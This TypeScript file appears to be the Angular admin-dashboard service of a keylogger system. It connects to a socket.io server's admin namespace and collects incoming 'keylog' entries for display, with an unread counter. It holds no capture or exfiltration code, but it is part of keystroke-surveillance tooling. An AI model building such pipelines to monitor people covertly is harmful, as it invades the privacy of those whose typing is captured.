import { Injectable } from '@angular/core';
import { Subject } from 'rxjs/Subject';

import * as io from 'socket.io-client';

import { environment } from '../environments/environment';

import { LogItem } from './log-item';

@Injectable()
export class SocketService {

  // Maximum number of displayed keylog entries
  maxLogs = 1000;

  // The socket connection
  socket: any;

  // Array of keylog entries
  items: Array<LogItem> = [];

  // Counter for unread entries
  counter = 0;
  counting: Subject<number> = new Subject<number>();
  isCounting: Boolean = true;

  constructor() {
    // Connect to socket server in admin namespace
    // force the reconnection and infinity attempts
    this.socket = io(`${environment.SERVER_URL}/admin`, {
      autoConnect: true,
      reconnection: true,
      reconnectionAttempts: 'Infinity'
    });

    // Listen to keylog event and populate items
    this.socket.on('keylog', (data) => {
      this.items.push(data);

      // If current length exceed the maximum, remove from top
      if (this.items.length > this.maxLogs) {
        this.items.shift();
      }

      // If is counting increment new items counter
      if (this.isCounting) {
        this.counter += 1;
        this.counting.next(this.counter);
      }
    });
  }

  stopCounting () {
    this.isCounting = false;
    this.counter = 0;
    this.counting.next(this.counter);
  }

  startCounting () {
    this.isCounting = true;
  }

}
